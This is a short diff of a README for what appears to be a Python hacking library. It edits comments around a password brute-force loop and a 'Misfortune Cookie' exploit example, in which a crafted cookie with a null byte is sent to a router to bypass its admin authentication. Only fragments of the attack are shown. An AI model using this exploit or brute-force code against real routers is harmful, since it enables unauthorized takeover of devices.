@@ -63,7 +63,7 @@ for p in passwords:
         break
     # For HTTP Basic Authentication logins, simply use 'if htmldata:'
 ```
-
+-
 #### Combining the Tools
 -
 Misfortune Cookie Exploit:
@@ -92,5 +92,5 @@ Accept-Encoding: gzip, deflate
 Cookie: C107351277=BBBBBBBBBBBBBBBBBBBB\x00''' + '\r\n\r\n'
 >>> hacklib.send('192.168.1.1', 80, payload)
 # The cookie replaced the firmware's Assembly code for web authentication with a null bye.
-# The router's admin page is now fully accessible.
+# The router's admin page is now fully accessible from any web browser.
 ```
